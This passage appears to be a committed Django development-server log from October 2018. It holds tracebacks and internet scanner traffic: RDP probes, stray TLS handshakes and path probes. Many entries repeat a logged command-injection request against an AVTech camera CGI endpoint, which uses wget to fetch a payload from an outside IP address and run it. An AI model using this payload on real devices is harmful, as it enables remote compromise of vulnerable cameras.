+  File "/usr/lib/python3.5/socketserver.py", line 681, in __init__
+    self.handle()
+  File "/home/ubuntu/venvDir/lib/python3.5/site-packages/django/core/servers/basehttp.py", line 139, in handle
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.5/socket.py", line 575, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+[14/Oct/2018 13:06:29] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00*%à\x00\x00\x00\x00\x00Cookie:')
+[14/Oct/2018 13:06:29] "  *%à     Cookie: mstshash=Test" 400 -
+[14/Oct/2018 13:06:29] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00*%à\x00\x00\x00\x00\x00Cookie:')
+[14/Oct/2018 13:06:29] "  *%à     Cookie: mstshash=Test" 400 -
+[14/Oct/2018 18:19:34] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[14/Oct/2018 18:19:34] "  /*à     Cookie: mstshash=Administr" 400 -
+[15/Oct/2018 01:27:27] "GET / HTTP/1.1" 200 1372
+[15/Oct/2018 01:32:43] "GET / HTTP/1.1" 200 1372
+Not Found: /status
+[15/Oct/2018 02:21:16] "GET /status HTTP/1.1" 404 2535
+[15/Oct/2018 10:58:26] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00+&à\x00\x00\x00\x00\x00Cookie:')
+[15/Oct/2018 10:58:26] "  +&à     Cookie: mstshash=hello" 400 -
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Oct/2018 12:10:57] "GET / HTTP/1.0" 400 60211
+[15/Oct/2018 12:44:11] "GET / HTTP/1.1" 200 1372
+[15/Oct/2018 12:44:11] "GET / HTTP/1.1" 200 1372
+[15/Oct/2018 12:44:12] "GET / HTTP/1.1" 200 1372
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Oct/2018 13:11:55] "GET / HTTP/1.0" 400 60209
+Traceback (most recent call last):
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 463, in _write
+    result = self.stdout.write(data)
+  File "/usr/lib/python3.5/socket.py", line 593, in write
+    return self._sock.send(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+[15/Oct/2018 13:11:55] "GET / HTTP/1.0" 500 59
+Traceback (most recent call last):
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 463, in _write
+    result = self.stdout.write(data)
+  File "/usr/lib/python3.5/socket.py", line 593, in write
+    return self._sock.send(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 141, in run
+    self.handle_error()
+  File "/home/ubuntu/venvDir/lib/python3.5/site-packages/django/core/servers/basehttp.py", line 86, in handle_error
+    super().handle_error()
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 368, in handle_error
+    self.finish_response()
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 274, in write
+    self.send_headers()
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 331, in send_headers
+    if not self.origin_server or self.client_is_modern():
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 344, in client_is_modern
+    return self.environ['SERVER_PROTOCOL'].upper() != 'HTTP/0.9'
+TypeError: 'NoneType' object is not subscriptable
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3.5/socketserver.py", line 625, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.5/socketserver.py", line 354, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.5/socketserver.py", line 681, in __init__
+    self.handle()
+  File "/home/ubuntu/venvDir/lib/python3.5/site-packages/django/core/servers/basehttp.py", line 154, in handle
+    handler.run(self.server.get_app())
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 144, in run
+    self.close()
+  File "/usr/lib/python3.5/wsgiref/simple_server.py", line 36, in close
+    self.status.split(' ',1)[0], self.bytes_sent
+AttributeError: 'NoneType' object has no attribute 'split'
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Oct/2018 13:12:21] "GET / HTTP/1.0" 400 60210
+[15/Oct/2018 17:11:13] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[15/Oct/2018 17:11:13] "  /*à     Cookie: mstshash=Administr" 400 -
+[15/Oct/2018 18:10:37] code 400, message Bad request syntax ('\x00\x00\x00TZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x010I\x00\x00\x00\x00\x80\x0b¨À\x00\x0c)t F\x07\x00tsXrcsXYs9\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00bbXcsXctst\x00\x00\x00\x00\x00\x00')
+[15/Oct/2018 18:10:37] "   TZ          0I    ¨À )t F tsXrcsXYs9                      bbXcsXctst      " 400 -
+Traceback (most recent call last):
+  File "/usr/lib/python3.5/socketserver.py", line 625, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.5/socketserver.py", line 354, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.5/socketserver.py", line 681, in __init__
+    self.handle()
+  File "/home/ubuntu/venvDir/lib/python3.5/site-packages/django/core/servers/basehttp.py", line 139, in handle
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.5/socket.py", line 575, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+[15/Oct/2018 21:47:23] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00*%à\x00\x00\x00\x00\x00Cookie:')
+[15/Oct/2018 21:47:23] "  *%à     Cookie: mstshash=Test" 400 -
+[15/Oct/2018 21:47:24] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00*%à\x00\x00\x00\x00\x00Cookie:')
+[15/Oct/2018 21:47:24] "  *%à     Cookie: mstshash=Test" 400 -
+[15/Oct/2018 23:26:49] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[15/Oct/2018 23:26:49] "  /*à     Cookie: mstshash=Administr" 400 -
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /cgi-bin/nobody/Search.cgi
+[16/Oct/2018 02:26:05] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 400 64443
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /cgi-bin/nobody/Search.cgi
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+[16/Oct/2018 02:40:14] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 400 64443
+Bad Request: /cgi-bin/nobody/Search.cgi
+[16/Oct/2018 02:40:14] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 400 64443
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /cgi-bin/nobody/Search.cgi
+[16/Oct/2018 04:26:43] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 400 64444
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /cgi-bin/nobody/Search.cgi
+[16/Oct/2018 09:17:04] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 400 64443
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /cgi-bin/nobody/Search.cgi
+[16/Oct/2018 09:40:51] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 400 64443
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /cgi-bin/nobody/Search.cgi
+[16/Oct/2018 18:56:13] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 400 64444
+Traceback (most recent call last):
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 463, in _write
+    result = self.stdout.write(data)
+  File "/usr/lib/python3.5/socket.py", line 593, in write
+    return self._sock.send(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+[16/Oct/2018 18:56:13] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 500 59
+Traceback (most recent call last):
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 463, in _write
+    result = self.stdout.write(data)
+  File "/usr/lib/python3.5/socket.py", line 593, in write
+    return self._sock.send(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 141, in run
+    self.handle_error()
+  File "/home/ubuntu/venvDir/lib/python3.5/site-packages/django/core/servers/basehttp.py", line 86, in handle_error
+    super().handle_error()
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 368, in handle_error
+    self.finish_response()
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 274, in write
+    self.send_headers()
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 331, in send_headers
+    if not self.origin_server or self.client_is_modern():
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 344, in client_is_modern
+    return self.environ['SERVER_PROTOCOL'].upper() != 'HTTP/0.9'
+TypeError: 'NoneType' object is not subscriptable
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3.5/socketserver.py", line 625, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.5/socketserver.py", line 354, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.5/socketserver.py", line 681, in __init__
+    self.handle()
+  File "/home/ubuntu/venvDir/lib/python3.5/site-packages/django/core/servers/basehttp.py", line 154, in handle
+    handler.run(self.server.get_app())
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 144, in run
+    self.close()
+  File "/usr/lib/python3.5/wsgiref/simple_server.py", line 36, in close
+    self.status.split(' ',1)[0], self.bytes_sent
+AttributeError: 'NoneType' object has no attribute 'split'
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /cgi-bin/nobody/Search.cgi
+[16/Oct/2018 19:43:56] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 400 64444
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /cgi-bin/nobody/Search.cgi
+[17/Oct/2018 00:50:21] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 400 64444
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /cgi-bin/nobody/Search.cgi
+[17/Oct/2018 00:58:46] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 400 64444
+[17/Oct/2018 06:57:14] "GET / HTTP/1.1" 200 1372
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /cgi-bin/nobody/Search.cgi
+[17/Oct/2018 12:55:46] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 400 64446
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /
+[17/Oct/2018 19:33:57] "GET / HTTP/1.0" 400 60211
+Traceback (most recent call last):
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 463, in _write
+    result = self.stdout.write(data)
+  File "/usr/lib/python3.5/socket.py", line 593, in write
+    return self._sock.send(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+[17/Oct/2018 19:33:57] "GET / HTTP/1.0" 500 59
+Traceback (most recent call last):
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 463, in _write
+    result = self.stdout.write(data)
+  File "/usr/lib/python3.5/socket.py", line 593, in write
+    return self._sock.send(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 141, in run
+    self.handle_error()
+  File "/home/ubuntu/venvDir/lib/python3.5/site-packages/django/core/servers/basehttp.py", line 86, in handle_error
+    super().handle_error()
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 368, in handle_error
+    self.finish_response()
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 274, in write
+    self.send_headers()
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 331, in send_headers
+    if not self.origin_server or self.client_is_modern():
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 344, in client_is_modern
+    return self.environ['SERVER_PROTOCOL'].upper() != 'HTTP/0.9'
+TypeError: 'NoneType' object is not subscriptable
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3.5/socketserver.py", line 625, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.5/socketserver.py", line 354, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.5/socketserver.py", line 681, in __init__
+    self.handle()
+  File "/home/ubuntu/venvDir/lib/python3.5/site-packages/django/core/servers/basehttp.py", line 154, in handle
+    handler.run(self.server.get_app())
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 144, in run
+    self.close()
+  File "/usr/lib/python3.5/wsgiref/simple_server.py", line 36, in close
+    self.status.split(' ',1)[0], self.bytes_sent
+AttributeError: 'NoneType' object has no attribute 'split'
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /cgi-bin/nobody/Search.cgi
+[17/Oct/2018 23:22:56] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 400 64442
+Traceback (most recent call last):
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 463, in _write
+    result = self.stdout.write(data)
+  File "/usr/lib/python3.5/socket.py", line 593, in write
+    return self._sock.send(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+[17/Oct/2018 23:22:56] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 500 59
+Traceback (most recent call last):
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 463, in _write
+    result = self.stdout.write(data)
+  File "/usr/lib/python3.5/socket.py", line 593, in write
+    return self._sock.send(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 141, in run
+    self.handle_error()
+  File "/home/ubuntu/venvDir/lib/python3.5/site-packages/django/core/servers/basehttp.py", line 86, in handle_error
+    super().handle_error()
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 368, in handle_error
+    self.finish_response()
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 274, in write
+    self.send_headers()
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 331, in send_headers
+    if not self.origin_server or self.client_is_modern():
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 344, in client_is_modern
+    return self.environ['SERVER_PROTOCOL'].upper() != 'HTTP/0.9'
+TypeError: 'NoneType' object is not subscriptable
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3.5/socketserver.py", line 625, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.5/socketserver.py", line 354, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.5/socketserver.py", line 681, in __init__
+    self.handle()
+  File "/home/ubuntu/venvDir/lib/python3.5/site-packages/django/core/servers/basehttp.py", line 154, in handle
+    handler.run(self.server.get_app())
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 144, in run
+    self.close()
+  File "/usr/lib/python3.5/wsgiref/simple_server.py", line 36, in close
+    self.status.split(' ',1)[0], self.bytes_sent
+AttributeError: 'NoneType' object has no attribute 'split'
+[18/Oct/2018 04:33:47] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[18/Oct/2018 04:33:47] "  /*à     Cookie: mstshash=Administr" 400 -
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /cgi-bin/nobody/Search.cgi
+[18/Oct/2018 08:16:48] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 400 64445
+Not Found: /verifylogin.do
+[18/Oct/2018 10:52:01] "GET /verifylogin.do HTTP/1.1" 404 2559
+Not Found: /invoker/readonly
+[18/Oct/2018 10:52:02] "GET /invoker/readonly HTTP/1.1" 404 2565
+Not Found: /indexweb4.jsp/
+[18/Oct/2018 10:52:03] "PUT /indexweb4.jsp/ HTTP/1.1" 404 2559
+[18/Oct/2018 10:52:03] "GET / HTTP/1.1" 200 1372
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /cgi-bin/nobody/Search.cgi
+[18/Oct/2018 13:31:50] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 400 64443
+[18/Oct/2018 19:20:09] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[18/Oct/2018 19:20:09] "  /*à     Cookie: mstshash=Administr" 400 -
+[19/Oct/2018 00:20:20] "GET / HTTP/1.1" 200 1372
+[19/Oct/2018 09:20:09] "GET / HTTP/1.1" 200 1372
+[19/Oct/2018 10:32:39] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[19/Oct/2018 10:32:39] "  /*à     Cookie: mstshash=Administr" 400 -
+Traceback (most recent call last):
+  File "/usr/lib/python3.5/socketserver.py", line 625, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.5/socketserver.py", line 354, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.5/socketserver.py", line 681, in __init__
+    self.handle()
+  File "/home/ubuntu/venvDir/lib/python3.5/site-packages/django/core/servers/basehttp.py", line 139, in handle
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.5/socket.py", line 575, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+[19/Oct/2018 16:44:32] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00*%à\x00\x00\x00\x00\x00Cookie:')
+[19/Oct/2018 16:44:32] "  *%à     Cookie: mstshash=Test" 400 -
+[19/Oct/2018 16:44:32] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00*%à\x00\x00\x00\x00\x00Cookie:')
+[19/Oct/2018 16:44:32] "  *%à     Cookie: mstshash=Test" 400 -
+[19/Oct/2018 22:38:52] "GET / HTTP/1.1" 200 1372
+[20/Oct/2018 01:48:52] code 400, message Bad request syntax ("\x16\x03\x03\x00\x9c\x01\x00\x00\x98\x03\x03[Ê\x89\x84Ï\x076\x89\x98Q?F\x14Ã`3âÓâiQ\x12\x15¸¢ø\x16we§~f\x00\x008À,À+À0À/\x00\x9f\x00\x9eÀ$À#À(À'À")
+[20/Oct/2018 01:48:52] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[20/Oct/2018 01:48:53] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x03\x00\x9c\x01\x00\x00\x98\x03\x03[Ê\x89')
+[20/Oct/2018 01:48:53] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /status
+[20/Oct/2018 02:44:31] "GET /status HTTP/1.1" 404 2535
+[20/Oct/2018 08:54:38] "GET / HTTP/1.1" 200 1372
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /cgi-bin/nobody/Search.cgi
+[20/Oct/2018 11:04:30] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 400 64442
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /cgi-bin/nobody/Search.cgi
+[20/Oct/2018 15:40:30] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 400 64446
+[20/Oct/2018 16:59:04] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[20/Oct/2018 16:59:04] "  /*à     Cookie: mstshash=Administr" 400 -
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /cgi-bin/nobody/Search.cgi
+[21/Oct/2018 06:17:36] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 400 64443
+[21/Oct/2018 17:18:12] "GET / HTTP/1.1" 200 1372
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /
+[21/Oct/2018 23:19:31] "GET / HTTP/1.0" 400 60211
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /
+[22/Oct/2018 01:57:26] "GET / HTTP/1.0" 400 60211
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /
+[22/Oct/2018 03:50:32] "GET / HTTP/1.0" 400 60211
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /
+[22/Oct/2018 08:39:00] "GET / HTTP/1.0" 400 60211
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /
+[22/Oct/2018 09:16:39] "GET / HTTP/1.0" 400 60209
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /
+[22/Oct/2018 13:39:48] "GET / HTTP/1.0" 400 60212
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /
+[22/Oct/2018 14:22:14] "GET / HTTP/1.0" 400 60210
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /cgi-bin/nobody/Search.cgi
